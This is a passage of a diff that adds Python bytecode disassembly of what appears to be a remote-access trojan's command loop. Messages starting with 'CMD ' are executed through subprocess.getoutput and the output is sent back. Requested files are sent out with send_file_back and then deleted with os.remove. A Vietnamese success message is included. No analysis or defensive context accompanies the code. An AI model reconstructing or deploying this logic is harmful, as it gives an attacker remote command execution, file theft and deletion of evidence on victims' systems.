+  66            LOAD_GLOBAL             21 (send_file_back + NULL)
+                LOAD_FAST                6 (path)
+                CALL                     1
+                POP_TOP
+
+  67    L3:     LOAD_GLOBAL             14 (os)
+                LOAD_ATTR               22 (remove)
+                PUSH_NULL
+                LOAD_FAST                6 (path)
+                CALL                     1
+                POP_TOP
+        L4:     JUMP_BACKWARD          145 (to L2)
+
+  65    L5:     JUMP_BACKWARD          147 (to L2)
+
+  69    L6:     LOAD_FAST                5 (text)
+                LOAD_ATTR               25 (startswith + NULL|self)
+                LOAD_CONST              15 ('CMD ')
+                CALL                     1
+                TO_BOOL
+        L7:     POP_JUMP_IF_TRUE         2 (to L8)
+                JUMP_BACKWARD          171 (to L2)
+
+  70    L8:     LOAD_FAST                5 (text)
+                LOAD_CONST              16 (4)
+                LOAD_CONST               0 (None)
+                BINARY_SLICE
+                STORE_FAST               7 (cmd_str)
+
+  71            LOAD_GLOBAL             26 (subprocess)
+                LOAD_ATTR               28 (getoutput)
+                PUSH_NULL
+                LOAD_FAST                7 (cmd_str)
+                CALL                     1
+                STORE_FAST               8 (output)
+
+  72            LOAD_GLOBAL             31 (send_text_back + NULL)
+                LOAD_FAST                8 (output)
+                LOAD_ATTR               11 (strip + NULL|self)
+                CALL                     0
+                TO_BOOL
+                POP_JUMP_IF_FALSE        2 (to L9)
+                LOAD_FAST                8 (output)
+                JUMP_FORWARD             1 (to L10)
+        L9:     LOAD_CONST              17 ('[+] Chay thanh cong.')
+       L10:     CALL                     1
+                POP_TOP
+                JUMP_BACKWARD          234 (to L2)
+
+  58   L11:     END_FOR
+                POP_TOP
+       L12:     RETURN_CONST             0 (None)
+
+  57   L13:     RETURN_CONST             0 (None)
+       L14:     RETURN_CONST             0 (None)
+
+  --   L15:     PUSH_EXC_INFO
+
+  68            POP_TOP
+       L16:     POP_EXCEPT
+                JUMP_BACKWARD          244 (to L2)
+
+  --   L17:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+       L18:     PUSH_EXC_INFO
+
+  73            POP_TOP
+
+  74   L19:     POP_EXCEPT
+                RETURN_CONST             0 (None)
+
+  --   L20:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+ExceptionTable:
+  L1 to L3 -> L18 [0]
+  L3 to L4 -> L15 [1]
+  L4 to L7 -> L18 [0]
+  L8 to L12 -> L18 [0]
+  L15 to L16 -> L17 [2] lasti
+  L16 to L18 -> L18 [0]
+  L18 to L19 -> L20 [1] lasti
